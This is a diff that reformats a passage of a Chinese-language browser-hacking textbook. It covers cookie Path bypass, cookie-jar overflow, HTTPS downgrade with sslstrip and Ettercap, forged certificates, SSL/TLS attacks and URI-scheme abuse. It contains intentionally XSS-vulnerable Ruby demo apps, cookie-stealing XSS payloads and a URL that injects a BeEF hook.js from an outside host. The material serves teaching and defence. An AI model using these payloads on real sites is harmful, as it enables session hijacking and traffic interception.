+假设在 `browserhacker.com` 的电子商务应用需要跟踪购物车中的商品，并在用户访问结账页面后进行一次身份验证以完成交易。此时，使用 `Secure` 标记可以让 Cookie 仅通过 HTTPS 版本的站点传输，从而进一步保护结账功能的 Cookie。
 
-Secure 标记的作用是只在 SSL 加密连接上发送 Cookie，这有助于防止 Cookie 在不当场景下被滥用，也能防止在窃听攻击中 Cookie 被泄露。
+`Secure` 标记的作用是只在 SSL 加密连接上发送 Cookie，这有助于防止 Cookie 在不当场景下被滥用，也能防止在窃听攻击中 Cookie 被泄露。
 
 ### 理解 Path 属性
 
-Path 属性配合 Domain 标记共同决定 Cookie 的适用范围。大型应用通常需要更宽的域或路径，以便在站点的多个位置跟踪用户。
+`Path` 属性配合 `Domain` 标记共同决定 Cookie 的适用范围。大型应用通常需要更宽的域或路径，以便在站点的多个位置跟踪用户。
 
-让我们回到电子商务应用在 browserhacker.com。理想情况下，应该使用两个 Cookie：一个会话 Cookie 用于跨所有 browserhacker.com 域跟踪用户；另一个会话 Cookie 在用户认证后，仅限于 /checkout 路径，用于跟踪结账过程中的用户。通过限制 Cookie 的路径并结合 HttpOnly 等安全功能，可以限制更敏感信息的暴露范围。
+让我们回到电子商务应用在 `browserhacker.com`。理想情况下，应该使用两个 Cookie：一个会话 Cookie 用于跨所有 `browserhacker.com` 域跟踪用户；另一个会话 Cookie 在用户认证后，仅限于 `/checkout` 路径，用于跟踪结账过程中的用户。通过限制 Cookie 的路径并结合 `HttpOnly` 等安全功能，可以限制更敏感信息的暴露范围。
 
 实际上并非如此。如果顶层内容易受 XSS 利用，攻击者可以通过注入的 JavaScript 在 IFrame 中打开受限路径，从而读取该 Cookie。即使子 IFrame 受同源策略（SOP）保护，Cookie 仍然会被暴露。下面的章节将展示此现象。
 
 ### 绕过 Path 属性限制
 
-基于前面的 Ruby 代码示例，我们构建了一个新应用，该应用公开两个路径，分别设置不同的 Cookie。根路径（/）设置名为 parent_cookie 的通用 Cookie，而 /checkout 路径设置名为 checkout_cookie 的更敏感 Cookie。代码在根路径中包含一个 XSS 漏洞，即 test 参数未被妥善处理：
+基于前面的 Ruby 代码示例，我们构建了一个新应用，该应用公开两个路径，分别设置不同的 Cookie。根路径（`/`）设置名为 `parent_cookie` 的通用 Cookie，而 `/checkout` 路径设置名为 `checkout_cookie` 的更敏感 Cookie。代码在根路径中包含一个 XSS 漏洞，即 `test` 参数未被妥善处理：
 
-```
+```ruby
 require 'rubygems'
+
 require 'thin'
+
 require 'rack'
+
 require 'sinatra'
+
 require 'json'
 
 class CookieDemo < Sinatra::Base
+
   get "/" do
+
     response.set_cookie "parent_cookie", {:value => 'yes',
+
       :domain => 'browserhacker.com', 
+
       :path => '/' }
 
     "Test parameter: " + params['test']
+
   end
 
   get "/checkout" do
+
     response.set_cookie "checkout_cookie",
+
         {:value => 'RESTRAINED TO THIS PATH',
+
          :domain => 'browserhacker.com', 
+
          :path => '/checkout' }
+
   end
 
 end
 
 @routes = {
+
     "/" => CookieDemo.new
+
 }
 
 @rack_app = Rack::URLMap.new(@routes)
+
 @thin = Thin::Server.new("browserhacker.com", 4000, @rack_app)
 
 Thin::Logging.silent = true
+
 Thin::Logging.debug = false
 
 puts "[#{Time.now}] Thin ready"
+
 @thin.start
 ```
 
--   假设 /checkout 路径没有 XSS 漏洞，则无法通过该路径窃取 checkout_cookie。但根路径存在 XSS 漏洞。攻击示例使用 alert() 函数演示 Cookie 暴露，实际攻击中会将 Cookie 发送到受控服务器。如果提交以下数据，parent_cookie 将被泄露：
+- 假设 `/checkout` 路径没有 XSS 漏洞，则无法通过该路径窃取 `checkout_cookie`。但根路径存在 XSS 漏洞。攻击示例使用 `alert()` 函数演示 Cookie 暴露，实际攻击中会将 Cookie 发送到受控服务器。如果提交以下数据，`parent_cookie` 将被泄露：
 
 ```
 /?test=hi<script>alert(document.cookie)%3b</script>
 ```
 
--   该请求的输出如 Figure 6-14 所示。
+- 该请求的输出如 Figure 6-14 所示。
 
- start figure 
+start figure 
 
 **Figure 6-14:** 根路径 Cookie 暴露
 
 ![c06f014.tif](img/c06f014.png)
 
- end figure 
+end figure 
 
--   要从 /checkout 路径窃取 Cookie，需要构造指向该路径的 IFrame。下面的 JavaScript 创建 IFrame 并加载后披露 Cookie：
+- 要从 `/checkout` 路径窃取 Cookie，需要构造指向该路径的 IFrame。下面的 JavaScript 创建 IFrame 并加载后披露 Cookie：
 
-```
+```javascript
 iframe=document.createElement('iframe');
 iframe.src='http://browserhacker.com:4000/checkout';
 iframe.onload=function(){
@@ -6494,7 +6488,7 @@ iframe.onload=function(){
 document.body.appendChild(iframe);
 ```
 
--   将其封装为单一负载，在 IFrame 完全加载时执行，可转换为：
+- 将其封装为单一负载，在 IFrame 完全加载时执行，可转换为：
 
 ```
 /?test=hi<script>iframe=document.createElement('iframe')%3b
@@ -6503,93 +6497,140 @@ iframe.src='http://browserhacker.com:4000/checkout'%3biframe
 )}%3bdocument.body.appendChild(iframe)</script>
 ```
 
--   执行此 JavaScript 的结果如 Figure 6-15 所示。
+- 执行此 JavaScript 的结果如 Figure 6-15 所示。
 
- start figure 
+start figure 
 
 **Figure 6-15:** 受限路径 Cookie 暴露
 
 ![c06f015.tif](img/c06f015.png)
 
- end figure 
+end figure 
 
--   该示例凸显了 Path 属性作为防护 Cookie 的方法存在缺陷，尤其是在存在 XSS 或其他 Web 应用漏洞时。即便启用了 HttpOnly 标记，也无法阻止通过 XSS 漏洞将流量代理到受害者浏览器，从而在“通过浏览器代理”章节（第 9 章）中描述的方式，利用 XSS 漏洞进行更高级的攻击。
+- 该示例凸显了 `Path` 属性作为防护 Cookie 的方法存在缺陷，尤其是在存在 XSS 或其他 Web 应用漏洞时。即便启用了 `HttpOnly` 标记，也无法阻止通过 XSS 漏洞将流量代理到受害者浏览器，从而在“通过浏览器代理”章节（第 9 章）中描述的方式，利用 XSS 漏洞进行更高级的攻击。
 
 ### 溢出 Cookie 存储（Cookie Jar）
 
-大多数网站期望设置 Cookie 后，它会以原来的状态返回。当站点设置 Cookie 时，它会被加入到 Cookie 存储（浏览器本地数据库），类似于真实的 Cookie 罐。该罐通常有容量限制。即使因 HttpOnly 等原因无法直接修改 Cookie，仍可能影响浏览器返回的 Cookie 信息。
+大多数网站期望设置 Cookie 后，它会以原来的状态返回。当站点设置 Cookie 时，它会被加入到 Cookie 存储（浏览器本地数据库），类似于真实的 Cookie 罐。该罐通常有容量限制。即使因 `HttpOnly` 等原因无法直接修改 Cookie，仍可能影响浏览器返回的 Cookie 信息。
 
 在可以在浏览器中创建 Cookie 的场景下，Alex Kouzemtchenko12、Chris Evans13（以及更近期的 John Wilander14）发现，可以通过溢出 Cookie 存储来删除较旧的 Cookie。随后用新 Cookie 替换已有 Cookie，从而控制用户与站点的交互。下面是一个示例：
 
-
-
-
 ```ruby
 require 'rubygems'
+
 require 'thin'
+
 require 'rack'
+
 require 'sinatra'
+
 require 'json'
 ```
+
 ```ruby
 class CookieDemo < Sinatra::Base
+
   get "/" do
+
     link_url = "http://www.google.com"
+
     if !request.cookies['link_url'] then
+
        response.set_cookie "link_url", {:value => link_url,
+
          :httponly => true}
+
     else
+
        link_url = request.cookies['link_url']
+
     end
+
     '<A HREF="' + link_url + '">Secret Login Page</A>
+
 <script>
+
 function setCookie()
+
 {
+
   document.cookie = "link_url=http://blog.browserhacker.com";
+
   alert("Single cookie sent");
+
 }
+
 function setCookies()
+
 {
+
   var i = 0;
+
   while (i < 200)
+
   {
+
     kname = "test_COOKIE" + i;
+
     document.cookie = kname + "=test";
+
     i = i + 1;
+
   }
+
   document.cookie = "link_url=http://browserhacker.com";
+
   alert("Overflow Executed");
+
 }
+
 </script>
+
 <BR>
+
 <input type=button value="Attempt Change" onclick="setCookie()"><BR>
+
 <input type=button value="Spam Cookies" onclick="setCookies()">
 ```
+
 ```ruby
+
   end
+
 end
 ```
+
 ```ruby
 @routes = {
+
     "/" => CookieDemo.new
+
 }
 ```
+
 ```ruby
 @rack_app = Rack::URLMap.new(@routes)
+
 @thin = Thin::Server.new("browserhacker.com", 4000, @rack_app)
 ```
+
 ```ruby
 Thin::Logging.silent = true
+
 Thin::Logging.debug = false
 ```
+
 ```ruby
 puts "[#{Time.now}] Thin ready"
+
 @thin.start
 ```
 
 
 
--   [当你需要攻击 HTTPS 通信时，特别是当会话 Cookie 只能通过 Secure 标记提交时会发生什么？] 你有若干处理 HTTPS 页面的方法，但其中三种是相对容易实现的。让我们来探讨 HTTP 降级攻击、证书攻击以及 SSL/TLS 攻击。
+# 当你需要攻击 HTTPS 通信时，特别是当会话 Cookie 只能通过 Secure 标记提交时会发生什么？
+
+你有若干处理 HTTPS 页面的方法，但其中三种是相对容易实现的。让我们来探讨 HTTP 降级攻击、证书攻击以及 SSL/TLS 攻击。
 
 ## Downgrading HTTPS to HTTP
 
@@ -6597,98 +6638,117 @@ HTTPS 加密流量在传输过程中（理论上）除非你拥有解密密钥�
 
 HTTP 降级攻击的目标是阻止用户访问 HTTPS 站点，或通过其他攻击将用户推回到 HTTP 版本的站点。如果你能强制浏览器访问 HTTP 版本的站点而不是 HTTPS 版本，你就可以在传输过程中查看敏感信息。你可以通过两种主要方式将请求从 HTTPS 重写为 HTTP：第一种是在网络上拦截数据并修改请求；第二种是在浏览器内部修改请求。
 
-当浏览器从 HTTP 过渡到 HTTPS 时，拦截网络流量并进行重写是降级到 HTTP 的最简便方式。一些 Web 应用在收到 HTTP 请求后会返回 302 响应，将浏览器重定向到站点的 HTTPS 版本。这正是你需要掌控并介入的关键点。你可以使用像 sslstrip17 这样的工具配合像 Ettercap 这样的 ARP Spoofing 工具来完成此操作，如第 2 章的“ARP Spoofing”部分简要说明。此过程相对简单，唯一的前提是服务器与客户端之间不存在双向认证（即 SSL 客户端证书）。
+当浏览器从 HTTP 过渡到 HTTPS 时，拦截网络流量并进行重写是降级到 HTTP 的最简便方式。一些 Web 应用在收到 HTTP 请求后会返回 `302` 响应，将浏览器重定向到站点的 HTTPS 版本。这正是你需要掌控并介入的关键点。你可以使用像 `sslstrip` 这样的工具配合像 `Ettercap` 这样的 ARP Spoofing 工具来完成此操作，如第 2 章的“ARP Spoofing”部分简要说明。此过程相对简单，唯一的前提是服务器与客户端之间不存在双向认证（即 SSL 客户端证书）。
 
 通过拦截网络流量并检测过渡（如 Figure 6-19 所示），你可以将所有 HTTPS 通信重写为 HTTP。在此情况下，你可以在本地管理 HTTP/HTTPS 过渡，从而查看所有应受保护的流量。目标只会看到 HTTP 流量，绝不会收到 HTTPS。结果是你与服务器通过 HTTPS 通信，而与目标浏览器通过 HTTP 通信。你实际上充当了加密终点。
 
- start figure 
+start figure
 
 **Figure 6-19:** 一个 Facebook 的 HTTP 到 HTTPS 重定向示例
 
 ![c06f019.tif](img/c06f019.png)
 
- end figure 
+end figure
 
-结合 sslstrip 和 Ettercap 还有其他好处。例如，你可以使用 Ettercap 过滤器在实时中操纵流量。在某些情况下，Web 应用开发者可能实现了自定义防护措施，虽然这类防御措施很少见，但它们可能阻碍可靠的 HTTP 降级。
+结合 `sslstrip` 和 `Ettercap` 还有其他好处。例如，你可以使用 `Ettercap` 过滤器在实时中操纵流量。在某些情况下，Web 应用开发者可能实现了自定义防护措施，虽然这类防御措施很少见，但它们可能阻碍可靠的 HTTP 降级。
 
-这就是 Ettercap 的作用所在。它可以在实时中重写内容，以中和开发者的防御措施。提高此攻击可靠性的最简便方式是重写链接，指向恶意站点的副本，并希望用户不会察觉。说实话——如果你并没有真正阻止目标访问他们喜欢的搞笑猫咪站点，他们又会注意到吗？
+这就是 `Ettercap` 的作用所在。它可以在实时中重写内容，以中和开发者的防御措施。提高此攻击可靠性的最简便方式是重写链接，指向恶意站点的副本，并希望用户不会察觉。说实话——如果你并没有真正阻止目标访问他们喜欢的搞笑猫咪站点，他们又会注意到吗？
 
 第二种 HTTP 降级攻击是通过 JavaScript 在文档内部重写链接。目标是修改 DOM，使指向 HTTPS 的链接被改为 HTTP。对于存在 XSS 漏洞且已被钩选的站点，这是最简便的选择。其缺点是许多站点已通过仅通过 HTTPS 传输受保护内容来防御此攻击，这限制了直接重写内容的可能性。
 
-为了进一步探讨，让我们查看一个存在 XSS 漏洞的示例页面。该页面有一个名为 lang 的输入参数，用于指定不同语言。该参数易受 XSS 攻击，因而可以用于将 BeEF 钩子注入目标浏览器：
+为了进一步探讨，让我们查看一个存在 XSS 漏洞的示例页面。该页面有一个名为 `lang` 的输入参数，用于指定不同语言。该参数易受 XSS 攻击，因而可以用于将 BeEF 钩子注入目标浏览器：
 
 ```
 require 'rubygems'
+
 require 'thin'
+
 require 'rack'
+
 require 'sinatra'
+
 require 'json'
 
 class InjectDemo < Sinatra::Base
+
   get "/" do
+
     lang = request['lang'] || "en_US";
+
 "
+
 <div align=center>
+
 To login, go to our secure login page at
+
 <A HREF='https://servervictim.com/login?lang=#{lang}'>
+
 https://servervictim.com/login
+
 </A>
+
 </div>"
+
   end
+
 end
 
 @routes = {
+
     "/" => InjectDemo.new
+
 }
 
 @rack_app = Rack::URLMap.new(@routes)
+
 @thin = Thin::Server.new("servervictim.com", 4000, @rack_app)
 
 Thin::Logging.silent = true
+
 Thin::Logging.debug = false
 
 puts "[#{Time.now}] Thin ready"
+
 @thin.start
 ```
 
-通过操纵 lang 变量，BeEF 钩子可以被注入。默认 lang 请求如 Figure 6-20 所示。
+通过操纵 `lang` 变量，BeEF 钩子可以被注入。默认 `lang` 请求如 Figure 6-20 所示。
 
- start figure 
+start figure
 
 **Figure 6-20:** 未发生 XSS 的登录页面源码
 
 ![c06f020.tif](img/c06f020.png)
 
- end figure 
+end figure
 
 要创建 BeEF 钩子，你需要编写一个注入语句，它会关闭 A 标签、添加脚本，并确保链接仍然显示。下面的 URL 示例会将 BeEF 钩子注入页面：
 
 ```
-http://servervictim.com:4000/?lang='><script
-src="http://browserhacker.com:3000/hook.js"></script>
+http://servervictim.com:4000/?lang='><script src="http://browserhacker.com:3000/hook.js"></script>
 ```
 
 一旦浏览器被 BeEF 钩选，你就可以将页面从 HTTPS 降级为 HTTP。在浏览器文件夹的 Hooked Domain 子文件夹中，有一个名为 “Replace HREFS (HTTPS)” 的模块。该模块会将页面上所有 HTTPS 链接替换为 HTTP 链接，如 Figure 6-21 所示。
 
- start figure 
+start figure
 
 **Figure 6-21:** BeEF 中的 HTTPS 降级模块
 
 ![c06f021.tif](img/c06f021.png)
 
- end figure 
+end figure
 
 模块运行后，除非用户仔细观察，否则变化不会很明显，因为 HTTPS 链接被替换为 HTTP 链接。敏锐的用户可能会注意到左下角的链接现在显示为 HTTP（如 Figure 6-22），但如果他们查看文档源码，页面仍显示为 HTTPS。
 
- start figure 
+start figure
 
 **Figure 6-22:** 新页面显示左下角的链接为 HTTP
 
 ![c06f022.eps](img/c06f022.png)
 
- end figure 
+end figure
 
-为了降低被检测的可能性，你可以在 <a> 元素上添加 onclick 事件，而不是直接修改 href 内容。这样在用户查看浏览器底部时，就不会察觉到 https:// 已经消失。
+为了降低被检测的可能性，你可以在 `<a>` 元素上添加 `onclick` 事件，而不是直接修改 `href` 内容。这样在用户查看浏览器底部时，就不会察觉到 `https://` 已经消失。
 
 这显然是一个简化的示例，但同类攻击几乎可以在任何存在 XSS 漏洞的页面上使用，而不仅仅是 URL。虽然 BeEF 并不自动执行所有这些操作，但仍可使用 BeEF 的 “Raw JavaScript” 模块将简单的 JavaScript 推送到目标浏览器。
 
@@ -6698,10 +6758,7 @@ src="http://browserhacker.com:3000/hook.js"></script>
 
 ### 使用假证书
 
-
-
-
-创建假证书很容易，许多攻击工具已经包含假证书。无论你选择使用代理、Ettercap 或其他工具，思路都是一样的。你向目标浏览器展示一个假证书，并充当其通信的中间点。别忘了，由于你创建了证书，你也拥有解密密钥。因为你可以解密 HTTPS 流量，所以可以完全拦截并篡改数据。
+创建假证书很容易，许多攻击工具已经包含假证书。无论你选择使用代理、`Ettercap` 或其他工具，思路都是一样的。你向目标浏览器展示一个假证书，并充当其通信的中间点。别忘了，由于你创建了证书，你也拥有解密密钥。因为你可以解密 HTTPS 流量，所以可以完全拦截并篡改数据。
 
 显而易见的缺点是用户会看到一个弹出消息。该消息表明证书不适用于该站点。在这种攻击中，真正的问题是：你相信用户会在看到弹出消息后三思而后行吗？在某个时刻，每个人都曾在明明知道不该点击的情况下，点击了不受信任的证书对话框。如果有人在至理名言告诉你他们从未这样做过，那就让他们立刻回到他们的阿米什社区！
 
@@ -6711,11 +6768,11 @@ src="http://browserhacker.com:3000/hook.js"></script>
 
 Nick Arnott 发表了研究，指出许多流行的 iPhone 应用未检查证书是否有效。通过展示自签名证书或任何证书，这些应用不会提示用户服务器不可信。类似的安全问题也发现于各种 Android 应用中。例如，斯坦福大学和奥斯汀大学的研究小组发现 Chase 移动银行应用存在类似缺陷。利用这一证书处理漏洞，可以通过提供自签名证书并监控连接来获取凭证、信用卡数据或其他信息。
 
- arguably the most notable of flawed certification validation vulnerabilities was Moxie Marlinspike’s null character exploit. This occurred when certain registrars would allow certificate requests with null characters. This doesn’t sound too malicious on its own, but when combined with the fact that the browsers were using C-based string functions without additional checks on the values, it became much more interesting.
+arguably the most notable of flawed certification validation vulnerabilities was Moxie Marlinspike’s null character exploit. This occurred when certain registrars would allow certificate requests with null characters. This doesn’t sound too malicious on its own, but when combined with the fact that the browsers were using C-based string functions without additional checks on the values, it became much more interesting.
 
- 当字符串检查函数查找数据时，它们会将 null 字符视为字符串的终止符。例如，正常的 "hello" 表示为 "hello\\0"，其中 \\0 是 null 字符的转义序列。
+当字符串检查函数查找数据时，它们会将 null 字符视为字符串的终止符。例如，正常的 `"hello"` 表示为 `"hello\0"`，其中 `\0` 是 null 字符的转义序列。
 
-通过创建名为 "www.google.com\\0.browserhacker.com" 的证书，注册机构会认为这是 browserhacker.com 的一部分，并知道该域名所有者可以为该域请求证书。然而，由于 null 前缀，当浏览器进行验证时，它会成功验证为 www.google.com。这将允许恶意人员创建包含 null 字符的证书，以冒充合法网站。
+通过创建名为 `"www.google.com\0.browserhacker.com"` 的证书，注册机构会认为这是 `browserhacker.com` 的一部分，并知道该域名所有者可以为该域请求证书。然而，由于 null 前缀，当浏览器进行验证时，它会成功验证为 `www.google.com`。这将允许恶意人员创建包含 null 字符的证书，以冒充合法网站。
 
 由于这些证书来自受信任的注册机构，浏览器不会质疑证书的有效性，也不会显示任何指示问题的弹出消息。这种攻击可以实现 SSL 窃听、篡改或其他攻击，而无需向目标表明任何异常。
 
@@ -6723,9 +6780,9 @@ Nick Arnott 发表了研究，指出许多流行的 iPhone 应用未检查证书
 
 ## 攻击 SSL/TLS 层
 
-安全套接层 (SSL) 及其后继的传输层安全 (TLS) 是安全网页浏览所使用的加密协议。像许多其他技术软件实现一样，它们也经历了自身的安全问题。利用这些弱点将允许披露通信通道的全部（或至少部分）内容。这些 SSL/TLS 层攻击通常不会在合理的时间内解密完整消息。但并非全然失望，因为它们可能揭示关键的 Cookie 数据或其他敏感信息，从而可用于进一步利用。在本文撰写时，已有三种获得知名度的攻击：BEAST 攻击、CRIME 攻击和 Lucky 13 攻击。
+安全套接层 `SSL` 及其后继的传输层安全 `TLS` 是安全网页浏览所使用的加密协议。像许多其他技术软件实现一样，它们也经历了自身的安全问题。利用这些弱点将允许披露通信通道的全部（或至少部分）内容。这些 SSL/TLS 层攻击通常不会在合理的时间内解密完整消息。但并非全然失望，因为它们可能揭示关键的 Cookie 数据或其他敏感信息，从而可用于进一步利用。在本文撰写时，已有三种获得知名度的攻击：BEAST 攻击、CRIME 攻击和 Lucky 13 攻击。
 
-BEAST 攻击是首个高知名度的 SSL 攻击，它利用了 Cipher-Block-Chaining (CBC) 加密模式的弱点。通过利用这一 SSL 漏洞，可以解密加密消息的部分内容。利用此弱点，可以在约两秒钟内揭示加密消息的一块内容。真实的利用此攻击需要针对特定用户进行定位，并且需要几分钟才能获得消息的一小部分。攻击者可以在几分钟到几小时内确定会话 Cookie，以劫持会话。
+BEAST 攻击是首个高知名度的 SSL 攻击，它利用了 Cipher-Block-Chaining `CBC` 加密模式的弱点。通过利用这一 SSL 漏洞，可以解密加密消息的部分内容。利用此弱点，可以在约两秒钟内揭示加密消息的一块内容。真实的利用此攻击需要针对特定用户进行定位，并且需要几分钟才能获得消息的一小部分。攻击者可以在几分钟到几小时内确定会话 Cookie，以劫持会话。
 
 CRIME 攻击是 BEAST 攻击的创建者（Juliano Rizzo 和 Thai Duong）随后的一次攻击。该攻击是 BEAST 释放后主要防御措施的回应。许多浏览器开发团队通过转向弱加密算法到 RC4 类加密算法来解决 BEAST 弱点。因此，CRIME 攻击应运而生，专门针对这类加密算法。它利用了 TLS 压缩的弱点来揭示数据。通过 JavaScript 和重复的网页请求，数据可以逐字节地确定。攻击者如果足够积极，结果类似于 BEAST 攻击。
 
@@ -6741,29 +6798,27 @@ CRIME 攻击是 BEAST 攻击的创建者（Juliano Rizzo 和 Thai Duong）随后
 
 # 滥用方案
 
-URI 方案是 URI 或 URL 中冒号 (:) 字符之前的第一部分。URI 方案在浏览器上下文中具有双重用途。首先，方案是一种方法，允许不同协议通过浏览器访问，例如 FTP 或 HTTPS。如果一个 URL 以 ftp: 开头，浏览器知道应使用 FTP 协议而非 HTTP 协议来建立连接。
+URI 方案是 URI 或 URL 中冒号 `:` 字符之前的第一部分。URI 方案在浏览器上下文中具有双重用途。首先，方案是一种方法，允许不同协议通过浏览器访问，例如 FTP 或 HTTPS。如果一个 URL 以 `ftp:` 开头，浏览器知道应使用 FTP 协议而非 HTTP 协议来建立连接。
 
-
-
--   第二种方案的功能是允许浏览器启动不同的本地行为。这有时包括打开新的应用程序。mailto: 方案就是一个例子。如果 HTML 网页中的锚标签包含 mailto: 链接，点击时，浏览器通常会打开外部应用程序来发送电子邮件。
+第二种方案的功能是允许浏览器启动不同的本地行为。这有时包括打开新的应用程序。`mailto:` 方案就是一个例子。如果 HTML 网页中的锚标签包含 `mailto:` 链接，点击时，浏览器通常会打开外部应用程序来发送电子邮件。
 
 ## 滥用 iOS
 
 当浏览器使用特定方案在另一个应用程序中执行操作时，可能会为你提供额外的攻击向量。这在 Nitesh Dhanjani 于 2010 年发表的关于 Apple iOS 中 URI 方案不安全处理的研究中被突出显示。23
 
-Dhanjani 的研究探讨了原生 iOS 协议处理例程，例如 tel: 处理器。如果 iOS Safari 浏览器请求一个 URL，例如 tel:613-966-94916，电话应用程序将启动并提示用户开始拨打建议的号码，如图 6-23 所示。Figure 6-23
+Dhanjani 的研究探讨了原生 iOS 协议处理例程，例如 `tel:` 处理器。如果 iOS Safari 浏览器请求一个 URL，例如 `tel:613-966-94916`，电话应用程序将启动并提示用户开始拨打建议的号码，如图 6-23 所示。Figure 6-23
 
- start figure 
+start figure
 
-**Figure 6-23:** iOS 处理 tel: 方案
+**Figure 6-23:** iOS 处理 `tel:` 方案
 
 ![c06f023.tif](img/c06f023.png)
 
- end figure 
+end figure
 
 这一例子未必表明实现不安全，因为电话应用程序仍会在继续之前提示用户确认通话。你可能会运气好，目标用户意外点击呼叫选项。但这非常不太可能，让我们再看看另一个例子。
 
-Skype 并未随 iOS 打包，但它使用自己独特的方案。为了让其他应用程序利用自定义 URI 方案，Apple 在其 Info.plist 规范中包含 CFBundleURLTypes 数组类型。这可以在下面的 Info.plist 文件片段中看到：
+Skype 并未随 iOS 打包，但它使用自己独特的方案。为了让其他应用程序利用自定义 URI 方案，Apple 在其 `Info.plist` 规范中包含 `CFBundleURLTypes` 数组类型。这可以在下面的 `Info.plist` 文件片段中看到：
 
 ```
 <key>CFBundleURLTypes</key>
@@ -6779,63 +6834,62 @@ Skype 并未随 iOS 打包，但它使用自己独特的方案。为了让其他
   </array>
 ```
 
-Skype 不仅将此方案暴露给浏览器，还接受额外参数。例如，如果 URL 以 ?call 结尾，Skype 不仅会启动，还会立即尝试拨打号码，而无需用户干预。浏览器只需加载类似 [skype://613-966-94916?call](http://skype://613-966-94916?call) 的 URL 即可在 iOS 设备的前景中启动 Skype。要利用此功能，只需在网页中包含包含这些特定 URL 的 IFrame 即可。你可以在 [`browserhacker.com`](https://browserhacker.com) 观看此漏洞的演示视频。
+
+
+Skype 不仅将此方案暴露给浏览器，还接受额外参数。例如，如果 URL 以 `?call` 结尾，Skype 不仅会启动，还会立即尝试拨打号码，而无需用户干预。浏览器只需加载类似 `[skype://613-966-94916?call](http://skype://613-966-94916?call)` 的 URL 即可在 iOS 设备的前景中启动 Skype。要利用此功能，只需在网页中包含包含这些特定 URL 的 IFrame 即可。你可以在 [`browserhacker.com`](https://browserhacker.com) 观看此漏洞的演示视频。
 
 Skype 在 3.0 版本后解决了此问题，现在会提示用户是否继续执行操作，如图 6-24 所示。Figure 6-24
 
- start figure 
+start figure
 
 **Figure 6-24:** iOS 在 Skype 内尝试拨打号码
 
 ![c06f024.tif](img/c06f024.png)
 
- end figure 
+end figure
 
 Dhanjani 的研究还探讨了分析 Info.plist 文件的几种方法，包括直接从越狱的 iOS 设备中复制它们，或通过 iTunes 备份提取应用程序的 Info.plist 文件。要从 iTunes 备份中提取应用程序的 Info.plist 文件，请执行以下步骤：
 
-Level1 **1.** 找到想要调查的 .ipa 文件。在 OS X 上，它们通常位于 ~/Music/iTunes/iTunes Media/Mobile Applications。在 Windows 上，它们通常位于 C:\\Users\\<user>\\My Music\\iTunes\\iTunes Media\\Mobile Applications\\。 **2.** 将 <application>.ipa 文件复制到其他位置，并将其重命名为 .zip 文件。 **3.** 解压该文件。 **4.** 进入 Payload/<application>.app/ 文件夹。 **5.** 使用 plutil 实用工具将 Info.plist 文件转换为 XML 格式。例如，plutil -convert xml1 Info.plist。在 Windows，plutil.exe 位于 C:\\Program Files\\Common Files\\Apple\\Apple Application Support\\。 
+Level1 **1.** 找到想要调查的 `.ipa` 文件。在 OS X 上，它们通常位于 `~/Music/iTunes/iTunes Media/Mobile Applications`。在 Windows 上，它们通常位于 `C:\\Users\\<user>\\My Music\\iTunes\\iTunes Media\\Mobile Applications\\`。 **2.** 将 `<application>.ipa` 文件复制到其他位置，并将其重命名为 `.zip` 文件。 **3.** 解压该文件。 **4.** 进入 `Payload/<application>.app/` 文件夹。 **5.** 使用 `plutil` 实用工具将 Info.plist 文件转换为 XML 格式。例如，`plutil -convert xml1 Info.plist`。在 Windows，`plutil.exe` 位于 `C:\\Program Files\\Common Files\\Apple\\Apple Application Support\\`。
 
 /Level1
 
-iOS 设备上有大量应用程序，许多可能会引入不寻常的 URI 方案处理例程。有了这种 Info.plist 查询技术，你可以发现 iOS 浏览器可能使用的其他方案。可能会发现与 Skype 初始不安全处理 skype:// 方案类似的漏洞。
+iOS 设备上有大量应用程序，许多可能会引入不寻常的 URI 方案处理例程。有了这种 Info.plist 查询技术，你可以发现 iOS 浏览器可能使用的其他方案。可能会发现与 Skype 初始不安全处理 `skype://` 方案类似的漏洞。
 
 ## 滥用 Samsung Galaxy
 
-不结构化补充服务数据 (USSD) 协议提供了一种方法，让 GSM 移动电话能够直接与用户的电信提供商通信。该服务通常在预付费移动电话计划中用于查询剩余余额，或甚至用于充值手机信用。当然，USSD 还有其他用途，如移动银行，或更新 Twitter 或 Facebook。
+不结构化补充服务数据 `USSD` 协议提供了一种方法，让 GSM 移动电话能够直接与用户的电信提供商通信。该服务通常在预付费移动电话计划中用于查询剩余余额，或甚至用于充值手机信用。当然，USSD 还有其他用途，如移动银行，或更新 Twitter 或 Facebook。
 
-虽然许多 USSD 代码可以发起与电信提供商的实时连接，但有些代码在手机本身上被分配了特定操作。例如，在大多数智能手机中，如果你打开电话应用并输入 *#06#，通常不需要拨号，你的 International Mobile Station Equipment Identity (IMEI) 会显示。Figure 6-25 展示了 Android 手机上的 IMEI，Figure 6-26 展示了 iPhone 上的相同功能。
+虽然许多 USSD 代码可以发起与电信提供商的实时连接，但有些代码在手机本身上被分配了特定操作。例如，在大多数智能手机中，如果你打开电话应用并输入 `*#06#`，通常不需要拨号，你的 International Mobile Station Equipment Identity `IMEI` 会显示。Figure 6-25 展示了 Android 手机上的 IMEI，Figure 6-26 展示了 iPhone 上的相同功能。
 
- start figure 
+start figure
 
 **Figure 6-25:** Android IMEI
 
 ![c06f025.tif](img/c06f025.png)
 
- end figure  start figure 
+end figure
+start figure
 
 **Figure 6-26:** iPhone IMEI
 
 ![c06f026.tif](img/c06f026.png)
 
- end figure 
+end figure
 
-Ravishankar Borgaonkar 的研究表明，某些 Android 手机会在没有任何用户交互的情况下执行 USSD 代码。25 该漏洞存在于 Android 手机处理 tel:// URI 方案的方式中。攻击非常类似于 Dhanjani 发现的 iOS 漏洞。然而，与 iOS 手机不同，Android 手机会立即执行 USSD 操作，而不会先启动电话应用程序并询问用户拨号。
+Ravishankar Borgaonkar 的研究表明，某些 Android 手机会在没有任何用户交互的情况下执行 USSD 代码。25 该漏洞存在于 Android 手机处理 `tel://` URI 方案的方式中。攻击非常类似于 Dhanjani 发现的 iOS 漏洞。然而，与 iOS 手机不同，Android 手机会立即执行 USSD 操作，而不会先启动电话应用程序并询问用户拨号。
 
-Borgaonkar 的研究进一步揭示了 Android 手机接收 USSD 代码并随后执行它的多种方式。许多依赖于关联应用程序的默认行为。通常，应用程序会检测到 tel:// URI 方案的存在，并直接将信息传递给相应的应用。这包括：
+Borgaonkar 的研究进一步揭示了 Android 手机接收 USSD 代码并随后执行它的多种方式。许多依赖于关联应用程序的默认行为。通常，应用程序会检测到 `tel://` URI 方案的存在，并直接将信息传递给相应的应用。这包括：
 
-*   在网站中嵌入恶意 IFrame，指向特定的 tel:// USSD 代码。
+*   在网站中嵌入恶意 IFrame，指向特定的 `tel://` USSD 代码。
+*   在二维码中嵌入 `tel://` USSD 地址。
+*   在 NFC 标签中嵌入 `tel://` USSD 地址。
 
